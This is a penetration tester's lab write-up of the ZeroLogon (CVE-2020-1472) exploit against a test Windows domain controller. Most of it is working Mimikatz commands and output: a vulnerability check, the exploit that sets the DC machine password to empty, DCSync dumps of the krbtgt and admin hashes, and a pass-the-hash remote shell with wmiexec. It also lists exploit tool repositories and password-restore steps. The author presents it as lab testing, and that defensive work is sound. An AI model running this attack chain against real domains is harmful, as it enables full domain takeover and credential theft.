===================================================================================================================
ZeroLogon exploit tests (CVE-2020-1472)
===================================================================================================================

Zerologon also known as CVE-2020-1472 affects a cryptographic authentication scheme(AES-CFB8) used by MS-NRPC, this scheme has multiple uses
however the reason this is so widely publicised is the ability to change computer account passwords which can lead to a total compromise of a Windows Domain by targeting Domain Controllers.

Exploitating this vulnerability allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf (e.g. DCsync attack).

Exploit steps to compromise a Domain Controller
------------------------------------------------
1. Spoofing the client credential
2. Disabling signing and sealing
3. Spoofing a call
4. Changing the Domain Controller's AD password to null
5. From password change to domain admin
6. ⚠️ reset the Domain Controller's AD password in a proper way to avoid any Denial of Service

Numerous tools and PoC scripts can be used to exploit the ZeroLogon vulnerability such as:
------------------------------------------------------------------------------------------
- https://github.com/gentilkiwi/mimikatz
- https://github.com/dirkjanm/CVE-2020-1472
- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/master/Invoke-ZeroLogon.ps1
- https://github.com/bb00/zer0dump

Personally I only tested the attack in my test lab using Mimikatz and it worked fine. 
I would not run this attack in a production environment during a penetration test (too risky).

Notes:
The Netlogon Remote Protocol (also called MS-NRPC) is a remote procedure call(RPC) interface that is used exclusively by domain-joined devices. 
MS-NRPC includes an authentication method and a method of establishing a Netlogon secure channel. 
These updates enforce the specified Netlogon client behaviour to use secure RPC with Netlogon secure channel between member computers and Active Directory (AD) domain controllers (DC).


===================================================================================================================
PoC - Step 1. Check if the targeted Domain Controller is vulnerable to ZeroLogon
===================================================================================================================

=> We use Mimikatz to check/confirm if the Domain Controller of our Lab is vulnerable

C:\Users\Administrator\Documents\Tools-AD\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::zerologon /target:TEMP-DC.SECURITY-TEST-LAB.LOCAL /account:TEMP-DC$
[rpc] Remote   : TEMP-DC.SECURITY-TEST-LAB.LOCAL
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : TEMP-DC.SECURITY-TEST-LAB.LOCAL
Account: TEMP-DC$
Type   : 6 (Server)
Mode   : detect

Trying to 'authenticate'...


  NetrServerAuthenticate2: 0x00000000

* Authentication: OK -- vulnerable

mimikatz #

=> It is prone to the Zerologon vulnerability !

===================================================================================================================
PoC - Step 2. Exploit phase
===================================================================================================================

=> Using Mimkatz we exploit the CVE and set the computer account's password to ""

mimikatz # lsadump::zerologon /target:TEMP-DC.SECURITY-TEST-LAB.LOCAL /account:TEMP-DC$ /exploit
[rpc] Remote   : TEMP-DC.SECURITY-TEST-LAB.LOCAL
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : TEMP-DC.SECURITY-TEST-LAB.LOCAL
Account: TEMP-DC$
Type   : 6 (Server)
Mode   : exploit

Trying to 'authenticate'...
==============================================

  NetrServerAuthenticate2: 0x00000000
  NetrServerPasswordSet2 : 0x00000000

* Authentication: OK -- vulnerable
* Set password  : OK -- may be unstable

mimikatz #


===================================================================================================================
PoC - Step 3. Perform DCsync attacks to take over the Domain
===================================================================================================================

=> We use the Domain Controller account 'SECURITY-TEST-LAB\TEMP-DC$' to perform DCsync attacks to collect:
   - the password hashs of a Domain Admin account (e.g. 'SECURITY-TEST-LAB\qulays' in our test lab )
   - the password hashs of the KRBTGT account
   - ...

mimikatz # lsadump::dcsync /domain:SECURITY-TEST-LAB.LOCAL /dc:TEMP-DC.SECURITY-TEST-LAB.LOCAL /user:krbtgt /authuser:TEMP-DC$ /authdomain:SECURITY-TEST-LAB /authpassword:"" /authntlm
[DC] 'SECURITY-TEST-LAB.LOCAL' will be the domain
[DC] 'TEMP-DC.SECURITY-TEST-LAB.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[rpc] Username : TEMP-DC$
[rpc] Domain   : SECURITY-TEST-LAB
[rpc] Password :

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 15/04/2020 09:00:23
Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 208ae4a2c5aa7b40d0473499408a2670
    ntlm- 0: 208ae4a2c5aa7b40d0473499408a2670
    lm  - 0: bb25cb33e1e02367f2fc2afcb2475493

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 66d811ed48e35423189b76966007f30e8feab5c14d66c33251e78463bc035f86
      aes128_hmac       (4096) : 082cb2101def04a88c035eb2ec1905c1
      des_cbc_md5       (4096) : 9dc1d9d51a02526d
<SNIP>


mimikatz # lsadump::dcsync /domain:SECURITY-TEST-LAB.LOCAL /dc:TEMP-DC.SECURITY-TEST-LAB.LOCAL /user:qualys /authuser:TEMP-DC$ /authdomain:SECURITY-TEST-LAB /authpassword:"" /authntlm
[DC] 'SECURITY-TEST-LAB.LOCAL' will be the domain
[DC] 'TEMP-DC.SECURITY-TEST-LAB.LOCAL' will be the DC server
[DC] 'qualys' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[rpc] Username : TEMP-DC$
[rpc] Domain   : SECURITY-TEST-LAB
[rpc] Password :

Object RDN           : Qualys

** SAM ACCOUNT **

SAM Username         : Qualys
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 01/01/1601 02:00:00
Password last change : 15/08/2021 21:54:54
Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-6098
Object Relative ID   : 6098

Credentials:
  Hash NTLM: db2729c0a6d072f7536c9ebd8194b854
    ntlm- 0: db2729c0a6d072f7536c9ebd8194b854
    ntlm- 1: 31b6be9560bbcd5679b5c2f20b9db20f
    ntlm- 2: f6ad8ffa822f869184f5421b12befb73
    lm  - 0: 7a14c29e6723aad11c5fa67775ef4012
    lm  - 1: 42f1e59af825c4451765b7b5e8a5167e
    lm  - 2: f3f0d8387fc25cf954d37d5c6011021d

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SECURITY-TEST-LAB.LOCALQualys
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 55a8996a27be71e9c0a5e747254873ec95715de333856ffbc5ef6993172cbfe3
      aes128_hmac       (4096) : 6fa2814f2be8e27c5b939399cc35b850
      des_cbc_md5       (4096) : ecd6341668342ff4
<SNIP>


=> We verify that the hashes we just dumped are valid. We are indeed administrator of the Domain Controller and Domain Admin.

PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:db2729c0a6d072f7536c9ebd8194b854 qualys@192.168.1.50
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>hostname
TEMP-DC

C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                                                    State
=============================== ============================================================== =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled
SeMachineAccountPrivilege       Add workstations to domain                                     Enabled
SeSecurityPrivilege             Manage auditing and security log                               Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled
SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled
SeSystemProfilePrivilege        Profile system performance                                     Enabled
SeSystemtimePrivilege           Change the system time                                         Enabled
SeProfileSingleProcessPrivilege Profile single process                                         Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled
SeCreatePagefilePrivilege       Create a pagefile                                              Enabled
SeBackupPrivilege               Back up files and directories                                  Enabled
SeRestorePrivilege              Restore files and directories                                  Enabled
SeShutdownPrivilege             Shut down the system                                           Enabled
SeDebugPrivilege                Debug programs                                                 Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled
SeUndockPrivilege               Remove computer from docking station                           Enabled
SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled
SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled
SeCreateGlobalPrivilege         Create global objects                                          Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled
SeTimeZonePrivilege             Change the time zone                                           Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled

<SNIP>

===================================================================================================================
PoC - Step 4. Clean-UP / Recover
===================================================================================================================

=> We revert our Test lab AD to a safe state by loading a previous virtual machine snapshot in VirtualBox.

Important note: Python scripts from dirkjanm's github can be used to restore the old password of the Domain Controller.

=> Github Link: https://github.com/dirkjanm/CVE-2020-1472

Restore steps
---------------
If you install a version of impacket from GitHub that was updated on or after September 15th 2020, secretsdump will automatically dump the plaintext machine password (hex encoded) when dumping the local registry secrets. 
Note that this is different from the DCSync, as DCSync uses the machine account, whereas dumping the registry requires you to execute secretsdump against the domain controller as a Domain Admin (such as the builtin Administrator account).
Alternatively on slightly older versions of secretsdump you can dump this same password by first extracting the registry hives and then running secretsdump offline (it will then always print the plaintext key because it can't calculate the Kerberos hashes).
With this plaintext password you can run restorepassword.py with the -hexpass parameter. 
This will first authenticate with the empty password to the same DC and then set the password back to the original one. 

Make sure you supply the netbios name and IP again as target, so for example:
python restorepassword.py testsegment/s2016dc@s2016dc -target-ip 192.168.222.113 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...etc

